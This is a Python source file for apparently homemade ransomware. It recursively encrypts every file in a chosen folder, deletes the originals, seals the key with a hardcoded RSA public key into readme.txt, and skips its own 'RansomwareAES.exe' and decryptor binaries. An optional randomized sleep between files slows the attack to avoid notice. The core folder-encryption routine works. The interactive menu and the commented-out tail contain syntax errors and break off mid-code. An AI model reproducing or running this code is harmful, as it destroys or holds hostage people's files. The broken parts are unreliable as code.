import random
import RandomTextGenerator
import os
from random import randrange
import time
from cryptography.fernet import Fernet

#portion divides the integer into portion-sized blocks to encrypt; essentially block size
portion = 3

'''
maxPrimeLength defines maximum length of a prime as an integer (e.g. 11 is a length of 2)
PrimeLengthDiff is the difference between the length of the two primes that will be used to make the key
Actual length will be between maxPrimeLength and maxPrimeLength - PrimeLengthDiff

NOTE:
portion MUST be less than 'n', which is the partialKey
In order to ensure this, preferable to be less than lowest possible prime length (i.e. < maxPrimeLength - PrimeLengthDiff)
'''
maxPrimeLength = 10
PrimeLengthDiff = 5

#for 'waiting' randomware; randomizes time (in seconds) between maxTimeSleep and maxTimeSleep - TimeSleepDiff from acting between individual file encryptions
randomSleep = False
maxTimeSleep = 10
TimeSleepDiff = 3



#n = Master partialKey, e = Master publicKey
n = 253406286806627605000279305413889990382764458707719140638141475051293476349213027265788135600256865458828104174198092904058253166364452947681743030431860444986930226709828762520085181730012927099515553431912487076118553619229217643180989393156446085137959780444641793807871586098963501224158428567674850412951604979170118232135985267085539877882536438104225085364280081118639646165200601256556523112373906214430654323522754739879267907155589671481257106969489162506362556698714068026699282369330280352018992338261544346403382097932023846819887591943134268618189253423382107196035533565775690793444286555241360544765760021965846518024056205698421823786821350632974893996521547138258276178105325869979712935655758925360510482354380248939350509954503292739011291249903774562281061137130249930739074107200855699903663230399977500755273708206293944116421237586307926793388914189888876460057042351374883490069387021285457186944006876487738978187370355514063183110841750637715629514202899464752893070429786158988905571193557370868938091659514217460042906213454707033473256394265403563872271285721575954279701688131427155203132754664563024686310968303235811502862545116012544861004387452962725189265941091476146009007952882622339740011925531428821773259127278113031956940165167721583884154912083076064429445928321066120071183139315299424722787550324494001146962770238284650526204613952940385077574700960512091932320916458077443332370209221153492097235749693225281661728135421787520848259180851609372838719289712599037043191174910869544104921095373575109453561135125891425291195065067744273563011774907163361905471330237989917601827893251363194907489102268770585302223791032496069831644291512716301592423091571568981679798323928173338170095858631274413215190009590438835754171812882903823551746082157769432708014985882540406922362728581310121786146691003697346323001269963677227732497692099532774992583651865462304845655492109706631147371932840235763935481648542919508641070966122037846118789467261386535488613308760746878912953470391405370009214311962644922048298166498697543919
e = 65537 


def encrypt(x, y, z):   #technically only a shell for "pow"
        x = int(x)
        return pow(x, y, z)

def decrypt(x, y, z):   #encrypt and decrypt areonly nominally different
        return pow(x, y, z)

def generateFiles(m):   #generates m random text files, encrypts them, and deletes the original
    key = Fernet.generate_key()
    AES = Fernet(key)
    integerKey = int.from_bytes(key, byteorder = 'big')
    print(integerKey)
    encryptedKey = encrypt(integerKey, e, n)
    print(encryptedKey)
    readme = open('readme.txt', 'w+')
    readme.write('Encrypted Key = ' + str(encryptedKey) )
    readme.close()
    key = None
    for i in range(m):
            newFile = open( str(i) + ".txt", "w+")
            newFile.write(RandomTextGenerator.returnText(random.randrange(1523)))
            newFile.close()
            encryptFile(str(i) + ".txt", AES)
            os.remove(str(i)+'.txt')
                



def encryptFile(fileName, AES):       #encrypts fileName using publicKey and partialKey
        toEncrypt = open(fileName, "rb")
        data = toEncrypt.read() 
        toEncrypt.close()

        

        encryptedData = AES.encrypt(data)
        
        encryptedFile = open("Encrypted" + fileName, "wb+")
        encryptedFile.write(encryptedData)
        encryptedFile.close()
        


                

def decryptFile(fileName, AES):      #decrypts fileName using privateKey and partialKey
        encryptedFile = open(fileName, "rb")
        toDecrypt = encryptedFile.read()
        encryptedFile.close()

        decryptedFile = open("Decrypted" + fileName, "wb+")
        decryptedData = AES.decrypt(toDecrypt)
        decryptedFile.write(decryptedData)
        decryptedFile.close()



        
def encryptFolder(folderName, AESin = None):     #encrypts folderName using publicKeyin and partialKeyin if provided; else generates
        #takes name of folder path (e.g. C:\\Users\\jhuang\\Desktop)
        os.chdir(folderName)
        if AESin == None:
                key = Fernet.generate_key()
                AES = Fernet(key)
                #numBytes = key.__len__()
                
                integerKey = int.from_bytes(key, byteorder = 'big')
                
                encryptedKey = encrypt(integerKey, e, n)
                readMe = open("readme.txt", "w+")
                message = "encryptedKey = " + str(encryptedKey)
                readMe.write(message)
                readMe.close()
                key = None
        elif AESin != None:
                AES = AESin
        else:
                print('what happened')
        

        
        contents = os.listdir()
        for x in contents:
                if randomSleep:
                        time.sleep(random.randint(maxTimeSleep - TimeSleepDiff, maxTimeSleep))
                if(not os.path.exists(x)):
                        print("does not exist: " + x)
                if(os.path.isfile(x)):
                        if x != 'readme.txt' and x != 'RansomwareAES.exe' and x != 'ConsumerDecryption.exe':
                                #filePaths.append(x)
                                print("encrypting file: " + x)
                                encryptFile(x, AES)
                                os.remove(x)
                elif(os.path.isdir(x)):
                        #folderPaths.append(x)
                        print("beginning encryption: " + folderName + "\\" + x)
                        encryptFolder(folderName + "\\" + x, AES)
                        print("continuing encryption: " + folderName)
                        os.chdir(folderName)
        AES = None
        AESin = None
                
        
def decryptFolder(folderName, privateKey):      #decrypts folderName using privateKey and partialKey
        os.chdir(folderName)
        contents = os.listdir()
        intoAES = int.to_bytes(privateKey, 44, byteorder='big')
        AES = Fernet(intoAES)
        for x in contents:
                if "Encrypted" in x:
                        if os.path.isfile(x):
                                print(x.replace('Encrypted', ''))
                                decryptFile(x, AES)
                                os.remove(x)
                                os.rename("Decrypted"+x, str.replace(x, "Encrypted", "", 1))
                elif "readme.txt" == x:
                        os.remove(x)
                elif os.path.isdir(x):
                                decryptFolder(folderName + "\\" + x, privateKey)
                                os.chdir(folderName)





#the beginning of the stuff (also known as the end)
currentKey = Fernet.generate_key()
currentAES = Fernet(currentKey)

while True:
        print(r"'help' for all available commands")
        command = input()
        if command == 'help':
                print(r"
                      'encrypt' for encrypting
                      'decrypt' for decrypting
                      'currentKey' for current key in use
                      ")
        elif command == 'encrypt':
                commandEncrypt()
        else:
                print('invalid command')
        

def commandEncrypt():
                print('File path?')
                inputpath = input()
                if os.path.exists(inputpath):
                        print('current or new key? (new key will replace current key)')
                        inputanswer = input()
                        if inputanswer == 'current':
                                if os.path.isfile(inputpath):
                                      encryptFile(inputpath, currentAES)
                                elif os.path.isdir(inputpath):
                                      encryptFolder(inputpath, currentAES)
                        elif inputanswer = 'new':
                                key = Fernet.generate_key()
                                AES = Fernet(key)
                                if os.path.isfile(inputpath):
                                        encryptFile(inputpath, AES)
                                elif os.path.isdir(inputpath):
                                        encryptFolder(inputpath, AES)
                                print('current key = ')
                                print(key)

def commandDecrypt():
        print('File path?')
        inputpath = input()
        if os.path.exists(inputpath):
                print('current or new key? (new key will replace current key)')
                inputanswer = input()
                if inputanswer == 'current':
                        if os.path.isfile(inputpath):
                                encryptFile(inputpath, currentAES)
                        elif os.path.isdir(inputpath):
                                encryptFolder(inputpath, currentAES)
                elif inputanswer = 'new':
                        key = Fernet.generate_key()
                        AES = Fernet(key)
                        if os.path.isfile(inputpath):
                                encryptFile(inputpath, AES)
                        elif os.path.isdir(inputpath):
                                encryptFolder(inputpath, AES)
                        print('current key = ')
                         print(key)
                              
"""
while True:
        print('e for encrypt, d for decrypt')
        inputted = input()
        if inputted == 'e':
                encryptionBool = True
                while encryptionBool:
                        print('folder for folder, or file for file')
                        inpute = input()
                        if inpute == 'file':
                                while encryptionBool:
                                        print('File path?')
                                        inputpath = input()
                                        if os.path.isfile(inputpath):
                                                while encryptionBool:
                                                        print('current or new?')
                                                        inputanswer = input()
                                                        if inputanswer == 'current':
                                                                encryptFile(inputpath, currentAES)
                                                        elif inputanswer = 'new':
                                                                key = Fernet.generate_key()
                                                                AES = Fernet(key)
                                                                encryptFile(inputpath, AES)
                                                                print('Key = ')
                                                                print(key)
                                                        while encryptionBool:
                                                                print('\n' + 'Autodecrypt? y/n')
                                                                inputanswer = input()
                                                                if inputanswer = 'y':
                                                                        autoDecrypt(inputpath, key, AES)
                                                                        inputanswer = None
                                                                        key = None
                                                                        AES = None
                                                                elif inputanswer = 'n':
                                                                        print('okie dokie then')
                                                                else:
                                                                        print('stop gooning')
                                        else:
                                                print('stop gooning')
                                        inputpath = None
                        elif inpute == 'folder':
                                while encryptionBool:
                                        print('Folder path, or this for current directory: ' + os.getcwd())
                                        inputpath = input()
                                        if os.path.isdir(inputpath):
                                                key = Fernet.generate_key()
                                                AES = Fernet(key)
                                                encryptFile(inputpath, AES)
                                        elif inputpath == 'this':
                                                
                                                
def keyType():
        while True:
        print('current or new?')
        inputanswer = input()

def autoDecrypt(path, key, AESin = None):
        if AESin == None:
                AES = Fernet(key)
        else:
                AES = AESin

        
        if os.path.isfile(path):
                decryptFile(path, AES)
        elif os.path.isdir(path):
                decryptFolder(path, key)
        else:
                print('error in autoDecrypt')
"""
